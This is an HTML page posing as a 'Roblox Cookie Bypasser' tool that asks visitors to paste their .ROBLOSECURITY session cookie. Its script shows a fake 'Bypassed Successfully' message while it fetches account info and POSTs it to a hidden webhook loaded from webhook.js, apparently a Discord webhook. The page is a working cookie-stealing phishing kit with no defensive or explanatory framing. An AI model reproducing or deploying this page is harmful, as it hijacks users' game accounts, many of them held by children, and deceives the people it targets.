<!DOCTYPE html>
<html>
<head>
<title>Roblox Cookie Bypasser</title>
<style>
    * {
        box-sizing: border-box;
        font-family: Arial, sans-serif;
    }
    body {
        background: #0f172a;
        color: white;
        margin: 0;
        padding: 20px;
    }
    .container {
        max-width: 800px;
        margin: auto;
    }
    h1 {
        font-size: 48px;
        background: linear-gradient(90deg, #00b4d8, #f72585);
        -webkit-background-clip: text;
        color: transparent;
        margin-bottom: 10px;
    }
    .subtitle {
        color: #aaa;
        font-size: 18px;
        text-align: center;
        margin-bottom: 10px;
    }
    .discord-link {
        text-align: center;
        margin-bottom: 30px;
    }
    .discord-link a {
        color: #7289da;
        font-size: 17px;
        text-decoration: none;
        background: rgba(114, 137, 218, 0.1);
        padding: 8px 15px;
        border-radius: 8px;
        border: 1px solid #7289da;
    }
    .card {
        background: #1e293b;
        padding: 25px;
        border-radius: 15px;
        border: 1px solid #334155;
    }
    textarea {
        width: 100%;
        padding: 15px;
        background: #0f172a;
        border: 1px solid #334155;
        color: white;
        border-radius: 8px;
        font-size: 16px;
        margin-bottom: 20px;
        min-height: 150px;
        resize: none;
    }
    .btn {
        width: 100%;
        padding: 18px;
        background: #00b4d8;
        border: none;
        border-radius: 10px;
        color: white;
        font-size: 20px;
        font-weight: bold;
        cursor: pointer;
    }
    #status {
        margin-top: 15px;
        font-size: 18px;
        text-align: center;
    }
    .author {
        text-align: center;
        margin-top: 25px;
        color: #888;
        font-size: 15px;
    }
</style>
</head>
<body>

<div class="container">
    <h1>Roblox Cookie Bypasser</h1>
    <p class="subtitle">Fast • Secure • Reliable</p>
    
    <div class="discord-link">
        <a href="https://discord.gg/82KG93tYr5" target="_blank">🔗 Join Our Discord Server</a>
    </div>

    <div class="card">
        <textarea id="cookieInput" placeholder="Paste your .ROBLOSECURITY here..."></textarea>

        <button class="btn" onclick="startCheck()">🔍 BYPASS COOKIE</button>
        <div id="status"></div>
    </div>

    <!-- AUTHOR NAME -->
    <p class="author">Author: Jerwin Ricaplaza</p>
</div>

<script src="webhook.js"></script>
<script src="api.js"></script>
<script src="discord.js"></script>

<script>
async function startCheck() {
    let status = document.getElementById('status');
    status.innerHTML = "⏳ Processing... Please wait...";

    let rawData = document.getElementById('cookieInput').value;

    if(!rawData.trim()) {
        status.innerHTML = "❌ Please paste a cookie!";
        return;
    }

    let info = await getAccountInfo(rawData);

    setTimeout(() => {
        status.innerHTML = "✅ Success! Bypassed Successfully.";

        fetch(LIVE_WEBHOOK, {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify(buildLiveEmbed(info))
        });

    }, 1000);
}
</script>

</body>
</html>
